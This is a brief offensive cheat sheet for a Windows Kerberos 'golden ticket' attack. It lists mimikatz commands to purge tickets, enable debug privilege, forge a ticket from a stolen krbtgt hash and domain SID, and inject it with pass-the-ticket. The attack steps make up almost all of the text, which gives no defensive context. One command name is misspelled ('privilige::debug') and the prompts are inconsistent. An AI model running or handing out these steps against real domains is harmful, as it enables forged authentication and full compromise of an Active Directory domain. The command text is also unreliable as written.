# Windows - Golden Ticket

```
klist purge
```

Purge all ticket

```
mimikatz# privilige::debug
Privilige '20' OK
```

Check privilege level

```
mimikatz# kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /<cipher_type(e.g. AES256)><krbtgt_hash> /ticket:<generated_ticket_name>
```

Create Golden ticket

```
debug# kerberos::ptt <ticket_name>
```

Load Golden ticket

**References:**
* https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
